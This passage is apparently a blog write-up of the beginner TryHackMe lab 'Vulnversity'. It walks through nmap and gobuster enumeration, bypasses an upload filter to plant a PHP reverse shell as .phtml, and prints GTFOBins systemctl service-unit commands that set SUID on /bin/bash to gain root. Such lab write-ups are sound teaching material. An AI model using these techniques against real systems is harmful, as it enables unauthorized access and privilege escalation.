Service Info: Host: VULNUNIVERSITY&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OSs: Unix, Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| smb-os-discovery: 
|   OS: Windows 6.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba 4.3.11-Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
|   Domain name: &lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
|   FQDN: vulnuniversity
|_  System &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2021-09-13T22:33:21-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2021-09-14T02:33:21
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Mon Sep 13 22:33:34 2021 -- 1 IP address (1 host up) scanned in 36.66 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;6 ports open, we’ll start enumerating the ftp first then as we go we’ll enumerate each port&lt;/p&gt;

&lt;h1 id=&quot;ftp&quot;&gt;FTP&lt;/h1&gt;

&lt;p&gt;If anonymous login was enabled, nmap would tell us that, but nmap is weird sometimes and doesn’t and I always like to check it manually anyway.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Anonymous login wasn’t enabled and no public exploits are available for that version. Moving on…&lt;/p&gt;

&lt;h1 id=&quot;smb&quot;&gt;SMB&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nothing to see here.. Moving on&lt;/p&gt;

&lt;h1 id=&quot;webserver---3333&quot;&gt;WebServer - 3333&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nothing on the page is clickable, most likely a static page. Checking the source code..&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well, nothing.. Starting a gobuster with different extensions&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s check other things while gobuster is running.&lt;/p&gt;

&lt;p&gt;Going to /robots.txt&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;404, but the server is disclosing which version of apache is the webserver running on. This would definitely be a finding on a pentest :)&lt;/p&gt;

&lt;p&gt;Checking what gobuster’s doing&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we get a hit on /internal , let’s check that out.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cool, let’s try uploading a php file&lt;/p&gt;

&lt;p&gt;Trying to upload a php reverse shell from pentestmonkey&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we get “Extension not allowed” , but what if it doesn’t check for other extensions other than .php? What if we try uploading a .phtml for example? Will that do the thing?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And hey, it says “Success”, now the question is where this file has been uploaded? Let’s try /internal/shell.phtml (also starting a netcat listener in the background)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Not here, but if we remember correctly, gobuster found an images directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Unfortunately, we don’t see our shell here, let’s try the root directory&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Not here… Let’s take a step back and gobuster again what’s inside of /internal directory&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And hey, we get a hit right away. Let’s go to /uploads&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We’ve already started the listener in the background, let’s just click it and see if we get a shell back&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We do, I have stabilized the shell, and read user.txt :)&lt;/p&gt;

&lt;p&gt;Now, we are www-data which is a service account, how can we escalate our privileges to another user or even root? I’ve tried simple things like sudo -l and finding suid binaries with find&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is one thing that really stands out, and that is systemctl, you don’t usually see that having a suid bit set, let’s check it on gtfobins.github.io , maybe we can escalate our privileges with it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well, good news, let’s click on “SUID”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s try escalating our privileges with it.&lt;/p&gt;

&lt;p&gt;Adjusting it a bit, this is what we’re going to run&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;TF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;.service
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[Service]
Type=oneshot
ExecStart=/bin/sh -c &quot;id &amp;gt; /tmp/output&quot;
[Install]
WantedBy=multi-user.target'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
systemctl &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
systemctl &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--now&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s modify “ExecStart” in order to set a suid bit on /bin/bash&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;TF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;.service
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[Service]
Type=oneshot
ExecStart=/bin/sh -c &quot;chmod +s /bin/bash&quot;
[Install]
WantedBy=multi-user.target'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
systemctl &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
systemctl &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--now&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Let’s try this&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well, that was it, an easy box, aimed for beginners. All I do when I write these write-ups is that I want to show you guys the methodology (if beginners are reading this), my thought process and all that stuff. Hope you’ve learned something new and I’ll see you next time&lt;/p&gt;</content><author><name>Miaulez</name><email>root@miaulez.rocks</email></author><category term="tryhackme" /><category term="infosec" /><category term="upload vulnerability" /><category term="security" /><category term="pentesting" /><category term="systemctl" /><summary type="html">Vulnversity is a beginner friendly box from TryHackMe. The initial foothold involves exploiting a poorly secured upload functionality. Privilege Escalation is done via systemctl which has suid bit set</summary></entry></feed>